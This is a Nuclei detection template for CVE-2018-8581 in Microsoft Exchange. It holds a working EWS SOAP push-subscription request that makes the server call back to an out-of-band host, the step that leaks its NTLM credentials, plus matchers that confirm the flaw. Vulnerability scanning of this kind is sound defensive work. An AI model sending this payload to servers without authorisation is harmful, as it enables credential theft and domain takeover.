http/cves/2018/CVE-2018-8581.yaml

id: CVE-2018-8581

info:
  name: Microsoft Exchange Server - Elevation of Privilege
  author: pranjal-negi
  severity: high
  description: |
    Microsoft Exchange Server contains an elevation of privilege caused by a vulnerability in the system, letting attackers escalate their privileges. The vulnerability exists because Exchange allows any user to specify any URL for push notifications, and the Exchange server will send its NTLM credentials to that URL.
  impact: |
    An attacker can use this vulnerability to impersonate other users or even gain Domain Admin privileges if the Exchange server has excessive permissions.
  remediation: |
    Apply the security updates provided by Microsoft. Additionally, disable push notifications if they are not required.
  reference:
    - https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/
    - https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8581
    - https://github.com/dirkjanm/PrivExchange
    - https://github.com/Ridter/Exchange2domain
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cve-id: CVE-2018-8581
    cwe-id: CWE-269,CWE-918
  metadata:
    max-request: 2
    vendor: microsoft
    product: exchange_server
    shodan-query: cpe:"cpe:2.3:a:microsoft:exchange_server"
  tags: cve,cve2018,exchange,ews,ssrf,ntlm,microsoft,kev

http:
  - raw:
      - |
        POST /EWS/Exchange.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        SOAPAction: "http://schemas.microsoft.com/exchange/services/2006/messages/Subscribe"
        Authorization: NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAFAs4OAAAADw==

      - |
        POST /EWS/Exchange.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        SOAPAction: "http://schemas.microsoft.com/exchange/services/2006/messages/Subscribe"

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
                       xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
                       xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages">
          <soap:Header>
            <t:RequestServerVersion Version="Exchange2016" />
          </soap:Header>
          <soap:Body>
            <m:Subscribe>
              <m:PushSubscriptionRequest SubscribeToAllFolders="true">
                <t:EventTypes>
                  <t:EventType>NewMailEvent</t:EventType>
                  <t:EventType>ModifiedEvent</t:EventType>
                  <t:EventType>MovedEvent</t:EventType>
                </t:EventTypes>
                <t:StatusFrequency>1</t:StatusFrequency>
                <t:URL>http://{{interactsh-url}}/</t:URL>
              </m:PushSubscriptionRequest>
            </m:Subscribe>
          </soap:Body>
        </soap:Envelope>

    cookie-reuse: true
    matchers-condition: or
    matchers:
      - type: word
        part: interactsh_protocol # Confirms the HTTP Interaction
        words:
          - "http"

      - type: dsl
        dsl:
          - 'status_code_1 == 401 && contains(to_lower(all_headers_1), "www-authenticate: ntlm")'
          - 'contains(to_lower(all_headers_2), "x-owa-version") || contains(to_lower(all_headers_2), "x-feserver")'
        condition: and

      - type: word
        part: body
        words:
          - 'ResponseClass="Success"'
          - "<m:ResponseCode>NoError</m:ResponseCode>"
          - "<m:SubscriptionId>"
        condition: and
